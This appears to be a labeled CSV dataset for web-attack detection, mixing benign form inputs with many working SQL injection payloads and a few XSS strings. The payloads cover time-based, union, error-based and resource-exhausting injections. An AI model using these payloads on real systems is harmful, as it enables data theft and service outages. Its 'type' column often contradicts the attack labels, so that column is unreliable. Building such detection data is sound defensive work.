Text,attack_type,Label,type
-2806'))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('rxzr'='rxzr,sqli,1,sql
36815dat1ra,norm,0,normal
vadim@drae2.ci,norm,0,normal
22181,norm,0,normal
valpalmas,norm,0,normal
46460133h,norm,0,normal
maderaje,norm,0,normal
4803866422185035,norm,0,normal
"1"" and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ""wtkx""=""wtkx",sqli,1,sql
bi-jun,norm,0,normal
"-2287')) union all select 1200,1200,1200,1200,1200#",sqli,1,sql
atuesta venturi,norm,0,normal
su0r6s09,norm,0,normal
"1'+(select 'nmhy' where 2919=2919 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
sampedro,norm,0,normal
"1;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
harlin,norm,0,normal
tubalcan,norm,0,normal
"1);select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4",sqli,1,sql
3740768702287666,norm,0,normal
1 where 7442=7442;begin user_lock.sleep(5); end--,sqli,1,sql
isla de cuba 85 3-b,norm,0,normal
"1%"") and 8024=3560--",sqli,1,sql
2720344476520602,norm,0,normal
gaylor,norm,0,normal
baruf,norm,0,normal
"1,(select (case when (8392=8404) then 1 else 8392*(select 8392 from information_schema.character_sets) end))",sqli,1,sql
fernan-gomez@juegosgratisinternet.sj,norm,0,normal
7973761744992556,norm,0,normal
majagua,norm,0,normal
"1));select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
yoselin,norm,0,normal
"1') and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1,normal
"azorin, 167",norm,0,normal
"calle monte miramar, s/n",norm,0,normal
sudip,norm,0,normal
"-3074')) union all select 6131,6131,6131,6131,6131,6131,6131--",sqli,1,sql
56926815k,norm,0,normal
"1 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))",sqli,1,sql
"1');select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('dthp'='dthp",sqli,1,sql
su7r5orato,norm,0,normal
irissou,norm,0,normal
"1'))) union all select null,null,null,null--",sqli,1,sql
1'))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('nfix'='nfix,sqli,1,sql
2595,norm,0,normal
48940261x,norm,0,normal
kabibble3@ccalzamora.gd,norm,0,normal
pauli,norm,0,normal
"1"")) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
"c/ blanquers 13, 9-b",norm,0,normal
columbino,norm,0,normal
"1' where 4245=4245 union all select null,null--",sqli,1,sql
valdiviezo montull,norm,0,normal
robledo,norm,0,normal
"1"") where 4172=4172 or (select * from (select(sleep(5)))sddo)#",sqli,1,sql
"-9606 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))# iuij",sqli,1,sql
"c/ la hoz, 17",norm,0,normal
1364,norm,0,normal
alyce,norm,0,normal
verile,norm,0,normal
-6310 or 6715=3399,sqli,1,normal
"1%"");select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--",sqli,1,sql
"1')) as fbjd where 8597=8597;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
afiligr*anado,norm,0,normal
regueras de arriba,norm,0,normal
"-1<iframe src=""javascript:document.cookie=true;""></iframe>",xss,2,xss
gaulle,norm,0,normal
"1"")));select sleep(5) and (((""lczw""=""lczw",sqli,1,sql
1') and sleep(5) and ('njud'='njud,sqli,1,normal
calle siete cerros 144,norm,0,normal
4016,norm,0,normal
1'||(select 'lvso' where 5675=5675;select case when 7717=7717 then 1 else null end--,sqli,1,sql
"1;select count(*) from generate_series(1,5000000)-- gqkk",sqli,1,sql
shar,norm,0,normal
1)));select sleep(5)#,sqli,1,sql
claudino,norm,0,normal
33734,norm,0,normal
quintana redonda,norm,0,normal
lahnstein agundis,norm,0,normal
"1')) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
ford-milani@castigadas.mk,norm,0,normal
1)) as pjkd where 1105=1105 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,sqli,1,sql
dennett,norm,0,normal
"1;select like('abcdefg',upper(hex(randomblob(500000000/2))))",sqli,1,sql
jaqueline,norm,0,normal
r09pe574,norm,0,normal
3040,norm,0,normal
"1%"" and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ""%""=""",sqli,1,sql
heinen,norm,0,normal
7960,norm,0,normal
"-3445 union all select 5505,5505,5505--",sqli,1,sql
rudisill8,norm,0,normal
"1') or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ('amjh'='amjh",sqli,1,sql
jackley@engibraltar.com.nu,norm,0,normal
1');(select * from (select(sleep(5)))srmq) and ('pags'='pags,sqli,1,sql
gaylord,norm,0,normal
kawahara,norm,0,normal
iair,norm,0,normal
1' where 2145=2145;select sleep(5)#,sqli,1,sql
cintio,norm,0,normal
burg,norm,0,normal
bjorn,norm,0,normal
kernke-langevin@estoeslahostia.kr,norm,0,normal
07901950r,norm,0,normal
"1' where 2025=2025 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
-6298' or 4724=4876,sqli,1,normal
gretal3,norm,0,normal
66866648j,norm,0,normal
"-4798%'))) union all select 3330,3330,3330#",sqli,1,sql
"1%"" and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
50546,norm,0,normal
'1,sqli,1,normal
1648,norm,0,normal
othello,norm,0,normal
"1"") where 6903=6903;select (case when (8808=1367) then 1 else 8808*(select 8808 from master..sysdatabases) end)--",sqli,1,sql
"1',exp(~(select * from (select concat(0x7171706a71,(select (elt(7759=7759,1))),0x717a767a71,0x78))x))",sqli,1,sql
"calle pintor julian alcaraz, 108, 10-a",norm,0,normal
"1%"")) union all select null,null,null,null--",sqli,1,sql
"-5013'))) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('ehwh' like 'ehwh",sqli,1,sql
chaudhar,norm,0,normal
"1"")) as fapw where 4722=4722 union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,sql
"1'+(select 'xqpe' where 4020=4020 union all select null,null--",sqli,1,sql
"1%""));select pg_sleep(5) and ((""%""=""",sqli,1,sql
aventajada,norm,0,normal
"1' in boolean mode) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
yaideem,norm,0,normal
"1')) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('dkra' like 'dkra",sqli,1,sql
"1'+(select 'ljtl' where 1766=1766;select count(*) from generate_series(1,5000000))+'",sqli,1,sql
"calle miramar, 169,",norm,0,normal
fiset,norm,0,normal
9054650550547446,norm,0,normal
"1""))) union all select null,null,null--",sqli,1,sql
22212,norm,0,normal
crosswel,norm,0,normal
1'))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((('mfmk'='mfmk,sqli,1,sql
"riba, la",norm,0,normal
"ronda outeiro s/n, 6d",norm,0,normal
59718568b,norm,0,normal
rubio,norm,0,normal
yernes y tameza,norm,0,normal
terroba@multireform.gn,norm,0,normal
"c/ hermenegilda portillo, 70",norm,0,normal
caldes,norm,0,normal
colera,norm,0,normal
4241,norm,0,normal
lli de vall,norm,0,normal
-3100') or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('etuj' like 'etuj,sqli,1,sql
"1"" where 3740=3740 rlike sleep(5)#",sqli,1,normal
maisonne,norm,0,normal
-2715')) or 6942=1636 and (('mqeq'='mqeq,sqli,1,normal
focas@programaciones.com.sz,norm,0,normal
33500,norm,0,normal
">""<style type=""text/javascript"">document.cookie=true;</style>",xss,2,sql
38847166m,norm,0,normal
jiyuan,norm,0,normal
"1')) as orvy where 7270=7270 union all select null,null,null,null,null,null,null,null#",sqli,1,sql
herod3,norm,0,normal
"1') procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ('qdhz'='qdhz",sqli,1,normal
2633,norm,0,normal
skolnik-daye@joll.ws,norm,0,normal
"1"" or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)",sqli,1,sql
35212,norm,0,normal
hoehn,norm,0,normal
charisse,norm,0,normal
"vajol, la",norm,0,normal
amenta,norm,0,normal
0882871112681539,norm,0,normal
ivancevi,norm,0,normal
1') where 4277=4277 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,sqli,1,sql
d68as4o,norm,0,normal
1'))) or (select * from (select(sleep(5)))sddo)#,sqli,1,sql
cubilla,norm,0,normal
"1"")) as zval where 2255=2255 or (select * from (select(sleep(5)))sddo)#",sqli,1,sql
"1'||(select 'ctgs' where 6809=6809 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
1';select case when 7426=6635 then 1 else null end--,sqli,1,sql
1');if(8858=5680) select 8858 else drop function pyuo--,sqli,1,sql
1'||(select 'xwbo' from dual where 1263=1263 waitfor delay '0:0:5')||',sqli,1,sql
higuera,norm,0,normal
chua@comerciosdeaspe.om,norm,0,normal
54738650f,norm,0,normal
24797673q,norm,0,normal
"1%' and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and '%'='",sqli,1,sql
correch climent,norm,0,normal
72523597c,norm,0,normal
7208264078394889,norm,0,normal
maria,norm,0,normal
2437,norm,0,normal
c!andeleta,norm,0,normal
sharron,norm,0,normal
8119845903210996,norm,0,normal
"1)) as vryv where 5600=5600;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
p21ita1a,norm,0,normal
raxter,norm,0,normal
54057566e,norm,0,normal
25560,norm,0,normal
"1"" and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""lgwe"" like ""lgwe",sqli,1,sql
"raco 67, 4?c",norm,0,normal
wessell.georg@smalltec.md,norm,0,normal
cosbey@ocymafa.py,norm,0,normal
"1;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4",sqli,1,sql
gallifa,norm,0,normal
"calle tajo, 182,",norm,0,normal
4417,norm,0,normal
masclans nieto,norm,0,normal
"xiprer 61, 2-a",norm,0,normal
rui-yuan,norm,0,normal
gibert mallorqun,norm,0,normal
d9str7par,norm,0,normal
"1"") where 5005=5005 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",sqli,1,sql
zorrilla guevara,norm,0,normal
delito,norm,0,normal
1'+(select 'gprq' where 8928=8928;waitfor delay '0:0:5'--,sqli,1,sql
4277877280233807,norm,0,normal
8264568534946529,norm,0,normal
-5067')) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (('vkab' like 'vkab,sqli,1,sql
"alcalde lopez rancao, 194, 3-e",norm,0,normal
5536600969659944,norm,0,normal
tacuara,norm,0,normal
"veintinueve de abril 0,",norm,0,normal
"-9606%""))) union all select 8572,8572,8572,8572,8572,8572,8572,8572,8572--",sqli,1,sql
"1') and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ('qvrd'='qvrd",sqli,1,sql
"1') or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('tvcm'='tvcm",sqli,1,normal
557ni03r5o,norm,0,normal
ferreira5,norm,0,normal
"<style type=""text/javascript"">alert('xss');</style>",xss,2,sql
"c/ boabdil, 91",norm,0,normal
av. de la reina sofia 151,norm,0,normal
"1') or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ('bzgs' like 'bzgs",sqli,1,sql
-8710 or 9323=9323#,sqli,1,normal
"-9382') union all select 4774,4774,4774,4774--",sqli,1,sql
2268,norm,0,normal
tyrell@masqueclases.sr,norm,0,normal
94046799y,norm,0,normal
homero,norm,0,normal
09220629k,norm,0,normal
9740,norm,0,normal
70892292j,norm,0,normal
4056899886613064,norm,0,normal
"duende, 138,",norm,0,normal
gayle@freetag.name,norm,0,normal
carol,norm,0,normal
monteon pasquina,norm,0,normal
"1"") as evoq where 8193=8193 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",sqli,1,sql
claros lafragueta,norm,0,normal
bettina,norm,0,normal
fors,norm,0,normal
9ar5i04o,norm,0,normal
38408789p,norm,0,normal
lareine2,norm,0,normal
lucembu$rgus,norm,0,normal
"1' in boolean mode) and elt(4249=4249,7259)#",sqli,1,normal
1';select case when 6555=7349 then 1 else null end--,sqli,1,sql
magdiel,norm,0,normal
ravid,norm,0,normal
kaz,norm,0,normal
"1);select benchmark(5000000,md5(0x4c4d6142))",sqli,1,sql
1769471856078209,norm,0,normal
1))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((8023=8023,sqli,1,sql
dra2atizar,norm,0,normal
santa cruz de tenerife,norm,0,normal
balutis,norm,0,normal
"1)) union all select null,null,null,null,null,null,null#",sqli,1,sql
56702228y,norm,0,normal
villalpando iturbide,norm,0,normal
31593,norm,0,normal
fayanne6,norm,0,normal
"1"" or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))",sqli,1,normal
8956108015903904,norm,0,normal
<style>@import'http://vulnerability-lab.com/crosssitescripting.css';</style>,xss,2,sql
"1))) and elt(4249=4249,7259) and (((5030=5030",sqli,1,normal
shaibal,norm,0,normal
"castillo de malpica 119,",norm,0,normal
1);select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,1,sql
"1) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (2868=2868",sqli,1,sql
02600,norm,0,normal
"calle colada de pozuelo, 43,",norm,0,normal
"1""))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (((""wwaq""=""wwaq",sqli,1,sql
"1%"" union all select null,null#",sqli,1,sql
ciencia 123 5b,norm,0,normal
cancio,norm,0,normal
21392437e,norm,0,normal
peine3@psychominders.gob,norm,0,normal
galindo beneyto,norm,0,normal
1'));select (case when (2774=5503) then 2774 else 2774*(select 2774 from information_schema.character_sets) end)#,sqli,1,sql
teosa,norm,0,normal
6148304241486263,norm,0,normal
karla,norm,0,normal
jade,norm,0,normal
barranco de fraga 132 11c,norm,0,normal
shalom,norm,0,normal
"calle el jazmin, 144 6?d",norm,0,normal
batalla de la horra,norm,0,normal
"-6561""))) or 6872=6872 and (((""azqp"" like ""azqp",sqli,1,normal
"manuela malasaa, 32,",norm,0,normal
seno,norm,0,normal
"1%'))) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((('%'='",sqli,1,sql
84826588n,norm,0,normal
amescua,norm,0,normal
a46min2zgo,norm,0,normal
2651,norm,0,normal
"c/ josep ametller i vias, 93,",norm,0,normal
"calle del mistral, 65",norm,0,normal
10665,norm,0,normal
whitman,norm,0,normal
488u7ra,norm,0,normal
adelantamiento,norm,0,normal
887pit1,norm,0,normal
t53s97ln747a,norm,0,normal
quilino,norm,0,normal
1'));select pg_sleep(5) and (('rnzp'='rnzp,sqli,1,sql
1m1n7eb9rs8,norm,0,normal
6417632466491788,norm,0,normal
"-9932"" union all select 4049,4049,4049--",sqli,1,sql
anoa,norm,0,normal
61128609z,norm,0,normal
1) where 8320=8320 waitfor delay '0:0:5'--,sqli,1,sql
89,norm,0,normal
"-8677'||(select 'ihpm' from dual where 9571=9571 union all select 9571,9571,9571,9571,9571,9571,9571,9571,9571,9571--",sqli,1,sql
telmaco,norm,0,normal
"1"" where 1234=1234;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
"1) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (7984=7984",sqli,1,sql
stock_chronopoulou@corjet.gm,norm,0,normal
46529,norm,0,normal
1' in boolean mode);select sleep(5)#,sqli,1,sql
"1 where 4468=4468 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
pisu@shamballa-pneuma.bu,norm,0,normal
1';(select * from (select(sleep(5)))srmq) and 'mcrt'='mcrt,sqli,1,sql
charmion,norm,0,normal
"calle poeta guimera, 2 13h",norm,0,normal
22655130s,norm,0,normal
rolleck@soybueno.mm,norm,0,normal
"1"" and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ""cecf""=""cecf",sqli,1,normal
09259,norm,0,normal
"1%"") and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
(select (case when (6581=6581) then 1 else cast(1 as int)/(select 0 from dual) end) from dual),sqli,1,sql
cinthia,norm,0,normal
"camaretas 166,",norm,0,normal
7a2a6t1ro,norm,0,normal
c/ alcazalquivir s/n,norm,0,normal
c/ euclides 51 6?e,norm,0,normal
richwine.badolati@gallegonicolas.er,norm,0,normal
"-5288') or make_set(1164=1710,1710) and ('pkwy'='pkwy",sqli,1,normal
42180,norm,0,normal
-2648') or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('sawt'='sawt,sqli,1,sql
cathey@100mbps.gs,norm,0,normal
85744372g,norm,0,normal
reich.puffy@g-audi.pe,norm,0,normal
"1))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (((6578=6578",sqli,1,normal
69653229y,norm,0,normal
"-1254"" or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)",sqli,1,sql
37766,norm,0,normal
delf,norm,0,normal
